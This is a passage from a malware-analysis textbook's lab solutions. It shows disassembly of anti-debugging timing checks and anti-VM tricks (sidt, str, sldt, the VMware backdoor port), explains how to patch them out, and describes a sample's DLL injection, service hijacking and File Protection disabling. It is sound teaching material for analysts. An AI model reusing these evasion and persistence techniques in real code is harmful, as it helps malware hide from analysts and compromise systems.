    address into the SEH call chain, as explained in Chapter 15\.
  prefs: []
  type: TYPE_NORMAL
- en: This manipulation happens from  through . When the div ecx instruction executes,
    it causes a divide-by-zero exception to occur because ECX is set to 0
  prefs: []
  type: TYPE_NORMAL
- en: earlier in the code, and this, in turn, causes the malware exception handler
    to execute at . The next two instructions process the divide-by-zero exception
    before returning execution to just after the division by zero. Execution will
    eventually lead to , where the SEH chain is restored by removing the malware’s
    exception handler.
  prefs: []
  type: TYPE_NORMAL
- en: The malware goes through all of this trouble to execute code that has a drastic
    time difference inside a debugger versus outside a debugger. As we explained in
    Chapter 8, exceptions are handled differently when running in a debugger and take
    a little bit longer to process. That small time delta is enough for the malware
    to determine if it is executing in a debugger.
  prefs: []
  type: TYPE_NORMAL
- en: '**The GetTickCount Function**'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we set a breakpoint at gethostbyname at 0x4015DB in order to see the domain
    name used by the malware, and we see that the malware terminates without hitting
    the breakpoint. Examining the code in the main function, we see two calls to GetTickCount,
    as shown in Listing 16-14L (in bold).
  prefs: []
  type: TYPE_NORMAL
- en: 00401584 call ds:**GetTickCount**
  prefs: []
  type: TYPE_NORMAL
- en: 0040158A mov [ebp+var_2B4], eax
  prefs: []
  type: TYPE_NORMAL
- en: 00401590 call sub_401000 
  prefs: []
  type: TYPE_NORMAL
- en: 00401595 call ds:**GetTickCount**
  prefs: []
  type: TYPE_NORMAL
- en: 0040159B mov [ebp+var_2BC], eax
  prefs: []
  type: TYPE_NORMAL
- en: 004015A1 mov ecx, [ebp+var_2BC]
  prefs: []
  type: TYPE_NORMAL
- en: 004015A7 sub ecx, [ebp+var_2B4]
  prefs: []
  type: TYPE_NORMAL
- en: 004015AD cmp ecx, 1 
  prefs: []
  type: TYPE_NORMAL
- en: 004015B0 jbe short loc_4015B7 
  prefs: []
  type: TYPE_NORMAL
- en: 004015B2 xor eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: 004015B4 mov [eax], edx 
  prefs: []
  type: TYPE_NORMAL
- en: 004015B6 retn
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 16-14L: Anti-debugging timing check using GetTickCount* **668**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Between the two calls to GetTickCount, the call to sub_401000 at  contains
    the same SEH manipulation code we saw in the QueryPerformanceCounter method we
    analyzed previously. Next, at , the malware compares the result of the time difference
    in milliseconds. If the time difference exceeds one millisecond, the code executes
    the instruction at , which is illegal because EAX is set to 0 in the previous
    instruction. This causes the malware to crash. To fix this, we just need to make
    sure that the jump at  is taken.
  prefs: []
  type: TYPE_NORMAL
- en: '**The rdtsc Instruction**'
  prefs: []
  type: TYPE_NORMAL
- en: Examining the decoding method sub_401300, we see that the code in Lab 16-3
  prefs: []
  type: TYPE_NORMAL
- en: differs from the decoding method in Lab 9-2\. In Lab 16-3, we find that the
    rdtsc instruction is used twice, and the familiar SEH manipulation code is in
    between. The rdtsc instructions are shown in Listing 16-15L (in bold), and we
    have omitted the SEH manipulation code from the listing.
  prefs: []
  type: TYPE_NORMAL
- en: 00401323 **rdtsc**
  prefs: []
  type: TYPE_NORMAL
- en: 00401325 push eax 
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 0040136D **rdtsc**
  prefs: []
  type: TYPE_NORMAL
- en: 0040136F sub eax, [esp+20h+var_20] 
  prefs: []
  type: TYPE_NORMAL
- en: 00401372 mov [ebp+var_4], eax
  prefs: []
  type: TYPE_NORMAL
- en: 00401375 pop eax
  prefs: []
  type: TYPE_NORMAL
- en: 00401376 pop eax
  prefs: []
  type: TYPE_NORMAL
- en: 00401377 cmp [ebp+var_4], 7A120h 
  prefs: []
  type: TYPE_NORMAL
- en: 0040137E jbe short loc_401385
  prefs: []
  type: TYPE_NORMAL
- en: 00401380 call sub_4010E0 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 16-15L: Anti-debugging timing check using rdtsc* The malware pushes
    the result of the rdtsc instruction onto the stack at , and later executes the
    rdtsc instruction again, this time subtracting the value it previously pushed
    onto the stack from the result (EAX) at . IDA Pro has mislabeled the first result
    as a local variable, var_20\. To correct this, right-click var_20 and change the
    instruction to appear as sub eax, [esp].'
  prefs: []
  type: TYPE_NORMAL
- en: Next, the time difference is stored in var_4 and compared to 0x7A120
  prefs: []
  type: TYPE_NORMAL
- en: '**1 6**'
  prefs: []
  type: TYPE_NORMAL
- en: (500000 in decimal) at . If the time difference exceeds 500000, sub_4010E0
    is called at . The sub_4010E0 function attempts to delete the malware from disk,
    but fails since it is running inside the debugger. Nevertheless, the malware will
    terminate because of the call to exit at the end of the function.
  prefs: []
  type: TYPE_NORMAL
- en: '**Summary**'
  prefs: []
  type: TYPE_NORMAL
- en: 'Lab 16-3 uses three different anti-debugging techniques to thwart analysis
    of the malware inside a debugger: QueryPerformanceCounter, GetTickCount, and rdtsc.
    The easiest way to beat this malware at its own game is to NOP-out the jumps or
    force them to be taken by changing them from conditional to non-conditional jumps.
    Once we figure out how to rename the malware (to *peo.exe*) in a debugger, we
    can exit the debugger, rename the file, and effectively use basic dynamic analysis
    techniques.'
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**669**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 17-1 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: This malware uses vulnerable x86 instructions to determine if it is running
    in a VM.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: 'The script finds three potential anti-VM instructions and highlights them in
    red: sidt, str, and sldt.'
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware will delete itself if either sidt or str detects VMware. If the
    sldt instruction detects malware, the malware will exit without creating its main
    thread, but it will create the malicious service MalService.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: On our machine running VMware Workstation 7 on an Intel Core i7, none of the
    techniques succeeded. Your results will vary depending on the hardware and software
    you use.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: See the detailed analysis for an explanation of why each technique did or didn’t
    work.
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: You can NOP-out the sidt and str instructions or flip the jump flags live while
    debugging the malware.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: Because this malware is the same as *Lab07-01.exe* except with added anti-VM
  prefs: []
  type: TYPE_NORMAL
- en: 'techniques, a good place to begin your analysis is with Lab 7-1\. Scanning
    the malware for new functions, we find two: sub_401000, a self-deletion method,
    and sub_401100, which appears to call the sldt instruction. We can run *Lab17-01.exe*
    in a VM and see what happens differently from Lab 7-1\. The dynamic analysis results
    vary from system to system and might be identical to Lab 7-1'
  prefs: []
  type: TYPE_NORMAL
- en: on your machine.
  prefs: []
  type: TYPE_NORMAL
- en: '**Searching for Vulnerable Instructions**'
  prefs: []
  type: TYPE_NORMAL
- en: 'We can automatically search for vulnerable x86 instructions using IDA Pro’s
    Python scripting capability (available in the commercial version). Create your
    own script using Listing 17-4 in Chapter 17, or use the script named *findAntiVM.py*
    provided with the labs. To run the script in IDA Pro, select **File****Script
    File** and open *findAntiVM.py*. You should see the following in IDA Pro’s output
    window:'
  prefs: []
  type: TYPE_NORMAL
- en: 'Number of potential Anti-VM instructions: 3'
  prefs: []
  type: TYPE_NORMAL
- en: 'This output indicates that the script detected three vulnerable instruction
    types. Scrolling through the disassembly window in IDA Pro, we see three instructions
    highlighted in red: sidt, str, and sldt. (If you don’t have the commercial version
    of IDA Pro, search for these instructions using **Search****Text**.)'
  prefs: []
  type: TYPE_NORMAL
- en: We’ll analyze each vulnerable instruction, focusing on what happens if the VM
    technique succeeds, how to defeat it, and why it does or doesn’t work on our machine.
  prefs: []
  type: TYPE_NORMAL
- en: '**670**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**The sidt Instruction—Red Pill**'
  prefs: []
  type: TYPE_NORMAL
- en: The sidt instruction (also known as Red Pill) is the first vulnerable instruction
    we encounter in this malware, as shown in Listing 17-1L at . This instruction
    stores the most significant 4 bytes of the sidt result var_420 at 
  prefs: []
  type: TYPE_NORMAL
- en: for later use in the code.
  prefs: []
  type: TYPE_NORMAL
- en: 004011B5 sidt fword ptr [ebp+var_428] 
  prefs: []
  type: TYPE_NORMAL
- en: 004011BC mov eax, dword ptr [ebp+var_428+2]
  prefs: []
  type: TYPE_NORMAL
- en: 004011C2 mov [ebp+var_420], eax 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 17-1L: Red Pill being used in Lab 17-1*'
  prefs: []
  type: TYPE_NORMAL
- en: The malware checks for a VM a few instructions later in the binary, as you can
    see in Listing 17-2L.
  prefs: []
  type: TYPE_NORMAL
- en: 004011DD mov ecx, [ebp+var_420]
  prefs: []
  type: TYPE_NORMAL
- en: 004011E3 shr ecx, 18h 
  prefs: []
  type: TYPE_NORMAL
- en: 004011E6 cmp ecx, 0FFh
  prefs: []
  type: TYPE_NORMAL
- en: 004011EC jz loc_40132F 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 17-2L: Comparison and conditional jump checking after using the sidt
    instruction* The most significant 4 bytes of the sidt result (var_420) are shifted
    at , since the sixth byte of sidt (fourth byte of var_20) contains the start
    of the base memory address. That fifth byte is compared to 0xFF, the VMware signature.'
  prefs: []
  type: TYPE_NORMAL
- en: If the jump is taken at , the malware detected a virtual environment, and will
    call the function at 0x401000 to terminate it and remove it from disk.
  prefs: []
  type: TYPE_NORMAL
- en: The check fails in our test environment, probably because we are on a multiprocessor
    machine. When we set a breakpoint at 0x4011EC, we see that ECX isn’t 0xFF (the
    signature for VMware). If Red Pill is effective in your environment, NOP-out the
    sidt instruction or force the jz at  to not jump in a debugger.
  prefs: []
  type: TYPE_NORMAL
- en: '**The str Instruction**'
  prefs: []
  type: TYPE_NORMAL
- en: 'The str instruction is the second vulnerable instruction in this malware, as
    seen at line 0x401204:'
  prefs: []
  type: TYPE_NORMAL
- en: '**1 7**'
  prefs: []
  type: TYPE_NORMAL
- en: 00401204 **str** word ptr [ebp+var_418]
  prefs: []
  type: TYPE_NORMAL
- en: The str instruction loads the task state segment (TSS) into the 4-byte local
    variable var_418\. The malware doesn’t use this local variable again until just
    after the call to GetModuleFileName.
  prefs: []
  type: TYPE_NORMAL
- en: If the str instruction succeeds, the malware will not create the MalService
    service. Listing 17-3L shows the check against the first 2 bytes, which must equal
    0  and 0x40  in order to match the signature for VMware.
  prefs: []
  type: TYPE_NORMAL
- en: 00401229 mov edx, [ebp+var_418]
  prefs: []
  type: TYPE_NORMAL
- en: 0040122F and edx, 0FFh
  prefs: []
  type: TYPE_NORMAL
- en: 00401235 test edx, edx 
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**671**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 00401237 jnz short loc_40124E
  prefs: []
  type: TYPE_NORMAL
- en: 00401239 mov eax, [ebp+var_418+1]
  prefs: []
  type: TYPE_NORMAL
- en: 0040123F and eax, 0FFh
  prefs: []
  type: TYPE_NORMAL
- en: 00401244 cmp eax, 40h 
  prefs: []
  type: TYPE_NORMAL
- en: 00401247 jnz short loc_40124E
  prefs: []
  type: TYPE_NORMAL
- en: 00401249 jmp loc_401338
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 17-3L: Checking the results of the str instruction* This check failed
    in our environment. When we set a breakpoint at 0x40122F, we saw that var_418
    contained 0x28, not 0x4000, the signature for VMware.'
  prefs: []
  type: TYPE_NORMAL
- en: If the str instruction check succeeds in your environment, NOP-out the str instruction
    or force the jnz at 0x401237 to jump in a debugger at runtime.
  prefs: []
  type: TYPE_NORMAL
- en: '**The sldt Instruction—No Pill**'
  prefs: []
  type: TYPE_NORMAL
- en: The sldt instruction (also known as No Pill) is the final anti-VM technique
    used in this malware. This technique is found in the function labeled sub_401100
    by IDA Pro. Listing 17-4L shows the sldt usage within sub_401100\.
  prefs: []
  type: TYPE_NORMAL
- en: 00401109 mov eax, dword_406048 ;0xDDCCBBAA
  prefs: []
  type: TYPE_NORMAL
- en: 0040110E mov [ebp+var_8], eax 
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 00401121 sldt word ptr [ebp+var_8]
  prefs: []
  type: TYPE_NORMAL
- en: 00401125 mov edx, [ebp+var_8]
  prefs: []
  type: TYPE_NORMAL
- en: 00401128 mov [ebp+var_C], edx
  prefs: []
  type: TYPE_NORMAL
- en: 0040112B mov eax, [ebp+var_C] 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 17-4L: Setup and execution of the sldt instruction* As you can see,
    var_8 is set to EAX at , and EAX was set to dword_406048'
  prefs: []
  type: TYPE_NORMAL
- en: in the previous instruction. dword_406048 contains an initialization constant
    (0xDDCCBBAA). The result of the sldt instruction is stored in var_8 and is ultimately
    moved into EAX at .
  prefs: []
  type: TYPE_NORMAL
- en: After this function returns, the result is compared to see if the low-order
    bits of the initialization constant are set to zero, as shown in Listing 17-5L
  prefs: []
  type: TYPE_NORMAL
- en: at . If the low-order bytes are not zero, the jump will be taken, and the malware
    will terminate without creating the thread.
  prefs: []
  type: TYPE_NORMAL
- en: 004012D1 call sub_401100
  prefs: []
  type: TYPE_NORMAL
- en: 004012D6 cmp eax, 0DDCC0000h 
  prefs: []
  type: TYPE_NORMAL
- en: 004012DB jnz short loc_40132B
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 17-5L: Checking the result of the sldt instruction execution* This
    check failed in our environment. When we set a breakpoint at 0x4012D6, we found
    that EAX was equal to 0xDDCC0000, which meant that the check for a VM failed.'
  prefs: []
  type: TYPE_NORMAL
- en: If No Pill is effective in your environment, you will need to NOP-out the three
    instructions in Listing 17-5L or force the jnz to not jump in a debugger.
  prefs: []
  type: TYPE_NORMAL
- en: '**672**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 17-2 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: The exports are InstallRT, InstallSA, InstallSB, PSLIST, ServiceMain, StartEXS,
    UninstallRT, UninstallSA, and UninstallSB.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The DLL is deleted from the system using a *.bat* file.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: A *.bat* file containing self-deletion code is created, as well as a file named
    *xinstall.log* containing the string "Found Virtual Machine, Install Cancel".
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: This malware queries the VMware backdoor I/O communication port using the magic
    value VX and the action 0xA by using the in x86 instruction.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: To get the malware to install, patch the in instruction at 0x100061DB at runtime.
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: To permanently disable the VM check, use a hex editor to modify the static string
    in the binary from [This is DVM]5 to [This is DVM]0\. Alternatively, NOP-out the
    check in OllyDbg and write the change to disk.
  prefs: []
  type: TYPE_NORMAL
- en: 7\.
  prefs: []
  type: TYPE_NORMAL
- en: InstallRT performs installation via DLL injection with an optional parameter
    containing the process to inject into. InstallSA performs installation via service
    installation. InstallSB performs installation via service install and DLL injection
    if the service to overwrite is still running.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: Lab 17-2 is an extensive piece of malware. Our goal with this lab is to demonstrate
    how anti-VM techniques can slow your efforts to analyze malware. We’ll focus our
    discussion on disabling and understanding the anti-VM aspects of the malware.
    We leave the task of fully reversing the malware in this sample to you.
  prefs: []
  type: TYPE_NORMAL
- en: 'Begin by loading the malware into PEview to examine its exports and imports.
    The malware’s extensive import list suggests that it has a wide range of functionality,
    including functions for manipulating the registry (RegSetValueEx), manipulating
    services (ChangeService), screen capturing (BitBlt), process listing (CreateToolhelp32Snapshot),
    process injection (CreateRemoteThread), and networking functionality (WS2_32.dll).
    We also see a set of export functions, mostly related to installation or removal
    of the malware, as shown here: **1 7**'
  prefs: []
  type: TYPE_NORMAL
- en: InstallRT InstallSA InstallSB
  prefs: []
  type: TYPE_NORMAL
- en: PSLIST
  prefs: []
  type: TYPE_NORMAL
- en: ServiceMain
  prefs: []
  type: TYPE_NORMAL
- en: StartEXS
  prefs: []
  type: TYPE_NORMAL
- en: UninstallRT UninstallSA UninstallSB
  prefs: []
  type: TYPE_NORMAL
- en: The ServiceMain function in the export list tells us that this malware probably
    can be run as a service. The names of the installation exports that end in the
    strings SA and SB may be the methods related to service installation.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**673**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 152](index-707_1.png)'
  prefs: []
  type: TYPE_IMG
- en: 'We attempt to run this malware and monitor it using dynamic analysis techniques.
    Using procmon, we set a filter on *rundll32.exe* (since we will use it to run
    the malware from the command line), and then run the following from the command
    line within our VM:'
  prefs: []
  type: TYPE_NORMAL
- en: rundll32.exe Lab17-02.dll,InstallRT
  prefs: []
  type: TYPE_NORMAL
- en: We immediately notice that the malware is deleted from the system and a file
    *xinstall.log* is left behind. This file contains the string "Found Virtual Machine,
    Install Cancel", which means that there is an anti-VM technique in the binary.
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*You will sometimes encounter logging capability in real malware because logging
    errors* *can help malware authors determine what they need to change in order
    for their attack* *to succeed. Also, by logging the result of the various system
    configurations they encounter, such as VMs, attackers can identify issues they
    may encounter during an attack.*'
  prefs: []
  type: TYPE_NORMAL
- en: When we check our procmon output, we see that the malware created the file *vmselfdel.bat*
    for the malware to delete itself. When we load the malware into IDA Pro and follow
    the cross-references back from the vmselfdel.bat string, we reach sub_10005567,
    which shows the self-deletion scripting code that is written to the *.bat* file.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we focus on determining why the malware deleted itself. We can use the
    *findAntiVM.py* script from the previous lab or work backward through the code
    by examining the cross-references to sub_10005567 (the *vmselfdel.bat* creation
    method). Let’s examine the cross-references, as shown in Figure 17-1L.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 17-1L: Cross-reference to sub_100055567*'
  prefs: []
  type: TYPE_NORMAL
- en: As you can see in Figure 17-1L, there are three cross-references to this function,
    each of which is located in a different export from the malware.
  prefs: []
  type: TYPE_NORMAL
- en: Following the cross-reference to InstallRT, we see the code shown in Listing
    17-6L in the InstallRT export function.
  prefs: []
  type: TYPE_NORMAL
- en: 1000D870 push offset unk_1008E5F0 ; char *
  prefs: []
  type: TYPE_NORMAL
- en: 1000D875 call sub_10003592
  prefs: []
  type: TYPE_NORMAL
- en: 1000D87A mov [esp+8+var_8], offset **aFoundVirtualMa ; "Found Virtual Machine,..."**
  prefs: []
  type: TYPE_NORMAL
- en: 1000D881 call sub_10003592
  prefs: []
  type: TYPE_NORMAL
- en: 1000D886 pop ecx
  prefs: []
  type: TYPE_NORMAL
- en: 1000D887 call sub_10005567
  prefs: []
  type: TYPE_NORMAL
- en: 1000D88C jmp short loc_1000D8A4
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 17-6L: Anti-VM check inside InstallRT*'
  prefs: []
  type: TYPE_NORMAL
- en: The call at  is to the vmselfdel.bat function. At , we see a reference to
    the string we found earlier in *xinstall.log*, as shown in bold. Examining the
    **674**
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: functions at  and , we see that  opens *xinstall.log* and  logs "Found Virtual
    Machine, Install Cancel" to the file.
  prefs: []
  type: TYPE_NORMAL
- en: Examining the code section shown in Listing 17-6L in graph mode, we see two
    code paths to it, both conditional jumps after the calls to sub_10006119
  prefs: []
  type: TYPE_NORMAL
- en: or sub_10006196\. Because the function sub_10006119 is empty, we know that sub_10006196
    must contain our anti-VM technique. Listing 17-7L shows a subset of the instructions
    from sub_10006196\.
  prefs: []
  type: TYPE_NORMAL
- en: 100061C7 mov eax, 564D5868h ;'VMXh' 
  prefs: []
  type: TYPE_NORMAL
- en: 100061CC mov ebx, 0
  prefs: []
  type: TYPE_NORMAL
- en: 100061D1 mov ecx, 0Ah
  prefs: []
  type: TYPE_NORMAL
- en: 100061D6 mov edx, 5658h ;'VX' 
  prefs: []
  type: TYPE_NORMAL
- en: 100061DB in eax, dx 
  prefs: []
  type: TYPE_NORMAL
- en: 100061DC cmp ebx, 564D5868h ;'VMXh' 
  prefs: []
  type: TYPE_NORMAL
- en: 100061E2 setz [ebp+var_1C]
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 100061FA mov al, [ebp+var_1C]
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 17-7L: Querying the I/O communication port*'
  prefs: []
  type: TYPE_NORMAL
- en: The malware is querying the I/O communication port (0x5668) using the in instruction
    at . (VMware uses the virtual I/O port for communication between the VM and the
    host OS.) This VMware port is loaded into EDX at
  prefs: []
  type: TYPE_NORMAL
- en: , and the action performed is loaded into ECX in the previous instruction.
  prefs: []
  type: TYPE_NORMAL
- en: In this case, the action is 0xA, which means “get VMware version type.” EAX
  prefs: []
  type: TYPE_NORMAL
- en: is loaded with the magic number 0x564d5868 (VMXh) at , and the malware checks
    that the magic number is echoed back immediately after the in instruction with
    the cmp at . The result of the comparison is moved into var_1C, and is ultimately
    moved into AL as sub_10006196’s return value.
  prefs: []
  type: TYPE_NORMAL
- en: This malware doesn’t appear to care about the VMware version. It just wants
    to see if the I/O communication port echoes back with the magic value. At runtime,
    we can bypass the backdoor I/O communication port technique by replacing the in
    instruction with a NOP. Inserting the NOP
  prefs: []
  type: TYPE_NORMAL
- en: allows the program to complete installation.
  prefs: []
  type: TYPE_NORMAL
- en: Before further analyzing the imports dynamically, let’s continue to examine
    the InstallRT export. The code in Listing 17-8L is taken from the start of the
    InstallRT export. The jz instruction at  determines if the anti-1 7
  prefs: []
  type: TYPE_NORMAL
- en: VM check will be performed.
  prefs: []
  type: TYPE_NORMAL
- en: 1000D847 mov eax, off_10019034 ; **[This is DVM]5**
  prefs: []
  type: TYPE_NORMAL
- en: 1000D84C push esi
  prefs: []
  type: TYPE_NORMAL
- en: 1000D84D mov esi, ds:atoi
  prefs: []
  type: TYPE_NORMAL
- en: 1000D853 add eax, 0Dh 
  prefs: []
  type: TYPE_NORMAL
- en: 1000D856 push eax ; Str
  prefs: []
  type: TYPE_NORMAL
- en: 1000D857 call esi ; **atoi**
  prefs: []
  type: TYPE_NORMAL
- en: 1000D859 test eax, eax 
  prefs: []
  type: TYPE_NORMAL
- en: 1000D85B pop ecx
  prefs: []
  type: TYPE_NORMAL
- en: 1000D85C jz short loc_1000D88E 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 17-8L: Checking the DVM static configuration option* Solutions to
    Labs'
  prefs: []
  type: TYPE_NORMAL
- en: '**675**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: The code uses atoi (shown in bold) to turn a string into a number. The number
    is parsed out of the string [This is DVM]5 (also shown in bold). The reference
    to [This is DVM]5 is loaded into EAX, and EAX is advanced by 0xD
  prefs: []
  type: TYPE_NORMAL
- en: at , which moves the string pointer to the 5 character, which is turned into
    the number 5 with the call to atoi. The test at  checks to see if the number
    parsed is 0\.
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*DVM is a static configuration option. If we open the malware in a hex editor,
    we can* *manually change the string to read [This is DVM]0, and the malware will
    no longer* *perform the anti-VM check.*'
  prefs: []
  type: TYPE_NORMAL
- en: The following excerpt shows a subset of the static configuration options in
    *Lab17-02.exe*, with a domain name and port 80 shown in bold. The LOG
  prefs: []
  type: TYPE_NORMAL
- en: option (also shown in bold) is probably used by the malware to determine if
    *xinstall.log* should be created and used.
  prefs: []
  type: TYPE_NORMAL
- en: '[This is RNA]newsnews'
  prefs: []
  type: TYPE_NORMAL
- en: '[This is RDO]**newsnews.practicalmalwareanalysis.com**'
  prefs: []
  type: TYPE_NORMAL
- en: '[This is RPO]**80**'
  prefs: []
  type: TYPE_NORMAL
- en: '[This is DVM]5'
  prefs: []
  type: TYPE_NORMAL
- en: '[This is SSD]'
  prefs: []
  type: TYPE_NORMAL
- en: '[This is **LOG**]1'
  prefs: []
  type: TYPE_NORMAL
- en: We’ll complete our analysis of InstallRT by analyzing the method sub_1000D3D0\.
    This method is long, but all of its imported functions and logging strings make
    the analysis process much easier.
  prefs: []
  type: TYPE_NORMAL
- en: The sub_1000D3D0 method begins by copying the malware into the Windows system
    directory. As shown in Listing 17-9L, InstallRT takes an optional argument. The
    strlen at  checks the string length of the argument. If the string length is
    0 (meaning no argument), iexplore.exe is used (shown in bold).
  prefs: []
  type: TYPE_NORMAL
- en: 1000D50E push [ebp+process_name] ; Str
  prefs: []
  type: TYPE_NORMAL
- en: 1000D511 call strlen 
  prefs: []
  type: TYPE_NORMAL
- en: 1000D516 test eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: 1000D518 pop ecx
  prefs: []
  type: TYPE_NORMAL
- en: 1000D519 jnz short loc_1000D522
  prefs: []
  type: TYPE_NORMAL
- en: 1000D51B push offset **aIexplore_exe ; "iexplore.exe"**
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 17-9L: Argument used as the target process name with iexplore.exe
    as the default* The export argument (or iexplore.exe) is used as a target process
    for DLL injection of this malware. At 0x1000D53A, the malware calls a function
    to find the target process in the process listing. If the process is found, the
    malware uses the process’s PID in the call to sub_1000D10D, which uses a common
    process injection trio of calls: VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread.
    We conclude that InstallRT performs DLL injection to launch the malware, which
    we confirm by running the malware (after patching the static DVM option) and using
    Process Explorer to see the DLL load into another process.'
  prefs: []
  type: TYPE_NORMAL
- en: '**676**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 153](index-710_1.png)'
  prefs: []
  type: TYPE_IMG
- en: Next, we focus on the InstallSA export, which has the same high-level structure
    as InstallRT. Both exports check the DVM static configuration option before performing
    the anti-VM checks. The only difference between the two is that InstallSA calls
    sub_1000D920 for its main functionality.
  prefs: []
  type: TYPE_NORMAL
- en: Examining sub_1000D920, we see that it takes an optional argument (by default
    Irmon). This function creates a service at 0x1000DBC4 if you specify a service
    name in the Svchost Netsvcs group, or it creates the Irmon service if you don’t
    specify a service name. The service is set with a blank description and a display
    name of *X* System Services, where *X* is the service name. After creating the
    service, InstallSA sets the *ServiceDLL* path to this malware in the Windows system
    directory. We confirm this by performing dynamic analysis and using *rundll32.exe*
    to call the InstallSA function. We use Regedit to look at the Irmon service in
    the registry and see the change shown in Figure 17-2L.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 17-2L: Registry overwrite of the* ServiceDLL *for Irmon* Because the
    InstallSA method doesn’t copy the malware to the Windows system directory, this
    installation method fails to install the malware.'
  prefs: []
  type: TYPE_NORMAL
- en: Finally, we focus on the InstallSB export, which has the same high-level structure
    as InstallSA and InstallRT. All three exports check the DVM static configuration
    option before performing the anti-VM check. InstallSB calls sub_1000DF22 for its
    main functionality and contains an extra call to sub_10005A0A.
  prefs: []
  type: TYPE_NORMAL
- en: The function sub_10005A0A disables Windows File Protection using the method
    discussed in Lab 12-4\.
  prefs: []
  type: TYPE_NORMAL
- en: The sub_1000DF22 function appears to contain functionality from both InstallSA
    and InstallRT. InstallSB also takes an optional argument containing a service
    name (by default NtmsSvc) that the malware uses to overwrite a service on the
    local system. In the default case, the malware stops the NtmsSvc service if it
    is running and overwrites *ntmssvc.dll* in the Windows system directory with itself.
    The malware then attempts to start the service again. If the malware cannot start
    the service, the malware performs DLL injection, as seen with the call at 0x1000E571\.
    (This is similar to how InstallRT works, except InstallSB injects into *svchost.exe*.)
    InstallSB also saves the old service **1 7**
  prefs: []
  type: TYPE_NORMAL
